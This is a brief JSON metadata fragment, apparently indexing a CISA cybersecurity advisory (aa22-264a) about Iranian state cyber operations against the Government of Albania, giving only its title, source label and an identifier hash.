  "advisory": "aa22-264a",
  "title": "Iranian State Actors Conduct Cyber Operations Against the Government of Albania | CISA",
  "source": "cybersecurity-advisories",
  "id": "1ceccd562c991c6759d720f523132be894cf723c7356e9f69b9799b087473f98"
}